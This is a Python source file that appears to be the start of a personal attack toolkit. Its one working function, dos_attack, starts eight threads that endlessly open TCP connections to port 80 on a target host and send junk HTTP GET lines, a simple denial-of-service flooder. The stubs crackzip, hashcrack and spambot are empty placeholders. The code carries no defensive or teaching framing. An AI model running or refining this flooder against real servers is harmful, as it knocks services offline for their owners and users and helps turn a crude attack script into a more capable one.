#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""pythonfile.py:	Description of pythonfile.py"""

__author__ = ""
__copyright__ = ""
__credits__ = ""

__license__ = ""
__version__ = ""
__email__ = ""
__status__ = ""

import socket
from threading import Thread

def dos_attack(host):
    """

    :return:
    """
    ip = host
    port = 80

    def dos():
        while True:
            mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                mysocket.connect((ip, port))
                mysocket.send(str.encode("GET " + "Kevin bei der Bundewehr" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "Kevin bei der Bundeswehr" + "HTTP/1.1 \r\n"), (ip, port))
            except socket.error as err:
                print("error: ", err)
            mysocket.close()

    for i in range(8):
        t = Thread(target=dos)
        t.start()

def crackzip():
    """

    :return:
    """
    pass

def hashcrack():
    """

    :return:
    """
    pass

def spambot():
    """

    :return:
    """
    pass